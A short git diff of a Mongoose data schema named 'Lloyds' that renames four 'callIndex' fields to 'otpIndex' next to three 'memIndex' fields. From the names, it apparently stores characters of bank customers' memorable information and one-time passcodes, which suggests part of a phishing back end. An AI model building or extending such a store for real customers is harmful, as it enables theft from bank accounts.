@@ -14,10 +14,10 @@ const lloydsSchema = new mongoose.Schema({
   memIndex1: String,
   memIndex2: String,
   memIndex3: String,
-  callIndex1: String,
-  callIndex2: String,
-  callIndex3: String,
-  callIndex4: String,
+  otpIndex1: String,
+  otpIndex2: String,
+  otpIndex3: String,
+  otpIndex4: String,
 });
 
 module.exports = mongoose.model("Lloyds", lloydsSchema);
